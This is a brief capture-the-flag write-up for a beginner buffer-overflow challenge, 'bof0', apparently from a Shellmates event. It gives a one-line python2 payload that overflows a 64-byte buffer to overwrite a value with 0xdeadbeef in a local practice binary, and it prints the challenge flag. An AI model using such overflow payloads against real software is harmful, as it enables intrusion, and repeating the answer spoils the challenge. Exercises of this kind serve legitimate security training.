# bof0

# Writeup

- Payload:  
```bash
python -c "import struct; print(64*'A'+struct.pack('I',0xdeadbeef))" | ./chall
```   

Note: Use python2

# Flag

`shellmates{WElC0me_to_PWn_w3LCoM3_t0_BOf}`